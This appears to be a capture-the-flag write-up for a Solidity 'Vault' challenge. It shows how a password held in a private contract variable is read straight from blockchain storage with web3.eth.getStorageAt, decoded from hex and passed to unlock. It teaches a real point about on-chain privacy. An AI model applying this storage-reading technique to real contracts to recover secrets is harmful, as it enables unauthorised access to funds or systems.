On this challege, we have to unlock the vault to win the challenge.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

First of all, we can see that we have 2 state variables.One of them is the locked variable which is public. That means that we can very easily see what it is inside the variable by typing "await contract.locked()"" . Also, we have the private variable password. Using the console, we cannot just see what it is inside just easily. Therefore, we have 2 options to try in order to solve the problem.
1. By brute forcing the password, untill we find the right one and then unlock the vault. It's possible to happen, but there is a much easier way to achieve this.
2. Somehow, to dump the password from the storage of the contract.

As we have already mentioned earlier, Ethereum is a public Blockchain. That means that everyone can see what exists inside of it. We know that password variable is uint private. In Ethereum from the Solidity Docs, we know that a private type access mean that a variable can be called only from the same smart-contract, not externally by using an another smart-contact or by calling contract.password() from console. As Ethereum is a public ledger, we can just query the smart-contract from it's storage.
Web3.js can help us achieving this, by typing in console:
```
var pwd // to create a variable 
web3.eth.getStorageAt(contract.address, 1,  function(err, result){pwd = result})
```
This command will return :
0x412076657279207374726f6e67207365637265742070617373776f7264203a29 .
That is the password in hexademical mode. We can very easily covert this hexademical in ascii from our consle by typing:
```
web3.utils.toAscii(pwd)
```
And this will return us:
``A very strong secret password :)``

As we have the hexademical version of the password, we can simply create a transaction in the function  unlock and the hexademical value as an input by typing:
```
contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
```
Now if we check the boolean variable locked by typing `` contract.locked() `` we can see that it is unlocked. We powned it.
To sum up, we should never insert data unecencrypted in Blockchain networks as, especially in public Blockchains, everyone can see what it is inside.


